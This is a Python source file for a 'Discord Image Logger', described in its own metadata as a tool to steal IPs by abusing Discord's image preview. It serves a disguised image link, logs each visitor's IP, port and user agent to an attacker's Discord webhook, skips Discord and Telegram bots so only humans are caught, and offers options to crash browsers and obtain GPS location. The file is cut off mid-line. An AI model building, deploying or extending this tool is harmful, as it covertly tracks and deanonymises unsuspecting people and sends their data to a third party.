# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "WEBHOOK HERE !",
    "image": "IMAGE HERE !",  # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<URL-escaped image link>)
    "imageArgument": True,  # Allows you to change the image via URL argument

    # CUSTOMIZATION #
    "username": "Image Logger",  # Webhook username
    "color": 0x00FFFF,  # Embed color

    # OPTIONS #
    "crashBrowser": False,

    "accurateLocation": False,  # GPS location, disabled by default

    "message": {
        "doMessage": False,
        "message": "Custom message here",
        "richMessage": True,
    },

    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,

    # REDIRECTION #
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
            }
        ],
    })

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            # Get client IP and port
            client_ip = self.client_address[0]
            client_port = self.client_address[1]

            # Parse the URL and query parameters
            parsed_url = parse.urlparse(self.path)
            query = parse.parse_qs(parsed_url.query)

            # User agent from headers
            useragent = self.headers.get('User-Agent', '')

            # Check blacklisted IPs
            if any(client_ip.startswith(prefix) for prefix in blacklistedIPs):
                self.send_response(403)
                self.end_headers()
                self.wfile.write(b'Forbidden')
                return

            # Bot detection
            bot = botCheck(client_ip, useragent)

            # Prepare content for Discord webhook embed
            description_lines = [
                f"**IP:** {client_ip}",
                f"**Port:** {client_port}",
                f"**User-Agent:** {useragent}",
                f"**Bot:** {bot or 'No'}",
            ]

            # Add more info if needed based on your existing logic (e.g. location, VPN)

            embed = {
                "title": "Image Logger - New Hit",
                "color": config["color"],
                "description": "\n".join(description_lines),
            }

            # Send to Discord webhook
            requests.post(config["webhook"], json={
                "username": config["username"],
                "embeds": [embed],
            })

            # Decide what content to serve (redirect, crash, image)
            if config["redirect"]["redirect"]:
                self.send_response(302)
                self.send_header('Location', config["redirect"]["page"])
                self.end_headers()
                return
            elif config["crashBrowser"]:
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                crash_html = "<scri
